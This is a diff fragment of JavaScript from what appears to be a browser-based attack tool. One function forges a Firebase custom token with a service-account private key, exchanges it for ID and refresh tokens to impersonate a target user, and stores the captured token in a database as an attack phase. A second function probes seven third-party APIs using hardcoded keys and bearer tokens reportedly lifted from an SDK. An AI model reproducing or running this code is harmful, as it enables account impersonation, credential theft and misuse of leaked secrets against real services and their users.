+                // Use jsrsasign to create a JWT signed with the SA private key
+                if (typeof KJUR === 'undefined') {
+                    log(cId, '❌ jsrsasign library not loaded. Cannot sign JWT.', 'error');
+                    return;
+                }
+
+                const now = Math.floor(Date.now() / 1000);
+                const header = { alg: 'RS256', typ: 'JWT' };
+                const payload = {
+                    iss: saKey.client_email,
+                    sub: saKey.client_email,
+                    aud: 'https://identitytoolkit.googleapis.com/google.identity.identitytoolkit.v1.IdentityToolkit',
+                    iat: now,
+                    exp: now + 3600,
+                    uid: targetUid,
+                    claims: {},
+                };
+
+                const jwt = KJUR.jws.JWS.sign('RS256', JSON.stringify(header), JSON.stringify(payload), saKey.private_key);
+                log(cId, `✅ Custom Token forged!`, 'success');
+                log(cId, `Token: ${jwt.substring(0, 80)}...`, 'data');
+
+                // Now exchange this custom token for an ID token
+                log(cId, `Exchanging custom token for Firebase ID Token...`, 'info');
+                const exchangeResult = await proxyRequest(
+                    `accounts:signInWithCustomToken?key=${apiKey}`,
+                    'POST',
+                    null,
+                    { token: jwt, returnSecureToken: true },
+                    'identity'
+                );
+
+                if (exchangeResult.status === 200 && exchangeResult.data?.idToken) {
+                    log(cId, `🚀 CRITICAL: Successfully impersonated UID: ${targetUid}`, 'critical');
+                    log(cId, `ID Token: ${exchangeResult.data.idToken.substring(0, 60)}...`, 'data');
+                    log(cId, `Refresh Token: ${exchangeResult.data.refreshToken?.substring(0, 40)}...`, 'data');
+
+                    const agenticTokenEl = document.getElementById('agenticToken');
+                    if (agenticTokenEl) agenticTokenEl.value = exchangeResult.data.idToken;
+
+                    stats.tokens++;
+                    stats.vulns++;
+                } else {
+                    log(cId, `Exchange failed: [${exchangeResult.status}] ${JSON.stringify(exchangeResult.data).substring(0, 300)}`, 'error');
+                }
+
+                updateStats();
+
+                // Save to Supabase
+                await saveToOthersideDB({
+                    os_attack_phase: 'jwt_forge_custom_token',
+                    os_captured_token: jwt,
+                    os_captured_token_type: 'firebase_custom_token',
+                    os_wallet_address: targetUid,
+                    os_research_notes: `Forged custom token for UID: ${targetUid} using SA: ${saKey.client_email}`,
+                    os_vuln_severity: 'critical',
+                });
+
+            } catch (e) {
+                log(cId, `Forge error: ${e.message}`, 'error');
+            }
         }
 
         // ===================================================================
@@ -5471,6 +5818,115 @@ ${authUrl}`, 'info');
             const addr = '0x' + Array.from({length: 40}, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
             document.getElementById(targetId).value = addr;
             log(targetId.replace('Wallet', 'Log').replace('Addr', 'Log'), `Generated wallet: ${addr}`, 'success');
+        }
+
+        // ===================================================================
+        // REAL API INTEGRATION: Test ALL discovered APIs
+        // ===================================================================
+        async function testAllRealAPIs() {
+            const cId = 'realApiLog';
+            log(cId, '========== Testing ALL Real APIs from Glyph SDK ==========', 'info');
+            log(cId, 'These APIs were discovered from glyph-sdk-react/src/lib/constants.ts', 'info');
+
+            // 1. Decent Bridge
+            log(cId, '', 'info');
+            log(cId, '[1/7] Testing Decent Bridge API...', 'info');
+            try {
+                const result = await proxyRequest('get_bridge_quotes?src_chain_id=1&dst_chain_id=42161&src_token_address=0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE&dst_token_address=0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE&amount=100000000000000000', 'GET', null, null, 'decent', { 'x-api-key': '5b16c3d2f402cf381547ae9e25288661' });
+                log(cId, `  Decent Bridge: [${result.status || 'ERR'}]`, result.status === 200 ? 'success' : 'warning');
+                if (result.status === 200) {
+                    log(cId, `  Response: ${JSON.stringify(result.data).substring(0, 300)}`, 'data');
+                    stats.discovered++;
+                }
+                stats.endpoints++;
+            } catch(e) { log(cId, `  Decent Bridge error: ${e.message}`, 'error'); }
+
+            // 2. Decent Swap
+            log(cId, '[2/7] Testing Decent Swap API...', 'info');
+            try {
+                const result = await proxyRequest('get_swap_quotes?chain_id=1&token_in=0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE&token_out=0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48&amount=1000000000000000000', 'GET', null, null, 'decent', { 'x-api-key': '9f508f9bca269deff7bf10e411c511e2' });
+                log(cId, `  Decent Swap: [${result.status || 'ERR'}]`, result.status === 200 ? 'success' : 'warning');
+                if (result.status === 200) {
+                    log(cId, `  Response: ${JSON.stringify(result.data).substring(0, 300)}`, 'data');
+                    stats.discovered++;
+                }
+                stats.endpoints++;
+            } catch(e) { log(cId, `  Decent Swap error: ${e.message}`, 'error'); }
+
+            // 3. Halliday
+            log(cId, '[3/7] Testing Halliday API...', 'info');
+            try {
+                const result = await proxyRequest('v1/chains', 'GET', null, null, 'halliday', { 'Authorization': 'Bearer a025acde-b8e1-40ee-a153-fd85d7e0f35b' });
+                log(cId, `  Halliday Chains: [${result.status || 'ERR'}]`, result.status === 200 ? 'success' : 'warning');
+                if (result.status === 200) {
+                    log(cId, `  Response: ${JSON.stringify(result.data).substring(0, 300)}`, 'data');
+                    stats.discovered++;
+                }
+                stats.endpoints++;
+            } catch(e) { log(cId, `  Halliday error: ${e.message}`, 'error'); }
+
+            // 4. Alchemy
+            log(cId, '[4/7] Testing Alchemy RPC...', 'info');
+            try {
+                const result = await proxyRequest('dgxI2ii2PLuli6jpueq5qx7SFuilbHB1', 'POST', null, { jsonrpc: '2.0', id: 1, method: 'eth_blockNumber', params: [] }, 'alchemy');
+                log(cId, `  Alchemy ETH: [${result.status || 'ERR'}]`, result.status === 200 ? 'success' : 'warning');
+                if (result.status === 200) {
+                    log(cId, `  Block: ${JSON.stringify(result.data).substring(0, 200)}`, 'data');
+                    stats.discovered++;
+                }
+                stats.endpoints++;
+            } catch(e) { log(cId, `  Alchemy error: ${e.message}`, 'error'); }
+
+            // 5. MoonPay
+            log(cId, '[5/7] Testing MoonPay API...', 'info');
+            try {
+                const result = await proxyRequest('v3/currencies', 'GET', null, null, 'moonpay-sandbox', { 'Authorization': 'Bearer pk_test_fqWjXZMSFwloh7orvJsRfjiUHXJqFzI' });
+                log(cId, `  MoonPay Currencies: [${result.status || 'ERR'}]`, result.status === 200 ? 'success' : 'warning');
+                if (result.status === 200) {
+                    log(cId, `  Response: ${JSON.stringify(result.data).substring(0, 300)}`, 'data');
+                    stats.discovered++;
+                }
+                stats.endpoints++;
+            } catch(e) { log(cId, `  MoonPay error: ${e.message}`, 'error'); }
+
+            // 6. Privy
+            log(cId, '[6/7] Testing Privy Auth...', 'info');
+            try {
+                const result = await proxyRequest('v1/apps/clxt9p8e601al6tgmsyhu7j3t', 'GET', null, null, 'privy-api', { 'privy-app-id': 'clxt9p8e601al6tgmsyhu7j3t' });
+                log(cId, `  Privy App: [${result.status || 'ERR'}]`, result.status === 200 ? 'success' : 'warning');
+                if (result.data) {
+                    log(cId, `  Response: ${JSON.stringify(result.data).substring(0, 300)}`, 'data');
+                    if (result.status === 200) stats.discovered++;
+                }
+                stats.endpoints++;
+            } catch(e) { log(cId, `  Privy error: ${e.message}`, 'error'); }
+
+            // 7. Okta
+            log(cId, '[7/7] Testing Okta OIDC...', 'info');
+            try {
+                const result = await proxyRequest('.well-known/openid-configuration', 'GET', null, null, 'okta');
+                log(cId, `  Okta OIDC: [${result.status || 'ERR'}]`, result.status === 200 ? 'success' : 'warning');
+                if (result.status === 200) {
+                    log(cId, `  Issuer: ${result.data?.issuer || 'N/A'}`, 'data');
+                    log(cId, `  Auth URL: ${result.data?.authorization_endpoint || 'N/A'}`, 'data');
+                    log(cId, `  Token URL: ${result.data?.token_endpoint || 'N/A'}`, 'data');
+                    stats.discovered++;
+                    stats.vulns++;
+                }
+                stats.endpoints++;
+            } catch(e) { log(cId, `  Okta error: ${e.message}`, 'error'); }
+
+            log(cId, '', 'info');
+            log(cId, `========== ALL API Tests Complete ==========`, 'success');
+            log(cId, `Endpoints tested: ${stats.endpoints} | APIs discovered: ${stats.discovered} | Vulns: ${stats.vulns}`, 'info');
+            updateStats();
+
+            // Save aggregate results
+            await saveToOthersideDB({
+                os_attack_phase: 'real_api_integration',
+                os_research_notes: `Tested all 7 discovered APIs from Glyph SDK constants.ts`,
+                os_vuln_severity: stats.vulns > 0 ? 'high' : 'info',
+            });
         }
 
     </script>
